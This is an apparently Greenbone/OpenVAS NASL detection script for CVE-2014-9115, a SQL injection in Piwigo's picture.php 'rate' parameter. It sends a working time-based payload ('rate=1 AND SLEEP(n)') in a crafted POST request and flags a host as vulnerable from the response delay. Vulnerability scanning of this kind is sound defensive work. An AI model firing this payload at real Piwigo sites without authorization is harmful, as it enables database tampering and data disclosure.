# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:piwigo:piwigo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805102");
  script_version("2025-09-05T15:40:40+0000");
  script_cve_id("CVE-2014-9115");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2014-11-21 13:41:43 +0530 (Fri, 21 Nov 2014)");
  script_name("Piwigo 'rate' Parameter SQLi Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_piwigo_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("piwigo/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/98665");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71066");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35221");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129088");

  script_tag(name:"summary", value:"Piwigo is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to the picture.php script not
  properly sanitizing user-supplied input to the 'rate' POST parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to manipulate SQL queries in the backend database, and disclose certain
  sensitive information.");

  script_tag(name:"affected", value:"Piwigo version 2.6.0, prior versions may
  also be affected.");

  script_tag(name:"solution", value:"No known solution was made available
  for at least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + "/picture.php?/1/category/1&action=rate";

host = http_host_name( port:port );

foreach i( make_list( 3, 5 ) ) {

  postdata = string( 'rate=1 AND SLEEP(' + i + ')' );

  req = string( 'POST ', url, ' HTTP/1.1\r\n',
                'Host: ', host, '\r\n',
                'Content-Type: application/x-www-form-urlencoded\r\n',
                'Content-Length: ', strlen( postdata ), '\r\n\r\n',
                postdata );

  start = unixtime();
  res = http_keepalive_send_recv( port:port, data:req );
  stop = unixtime();

  if( stop - start < i || stop - start > ( i + 5 ) ) continue; # not vulnerable

  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
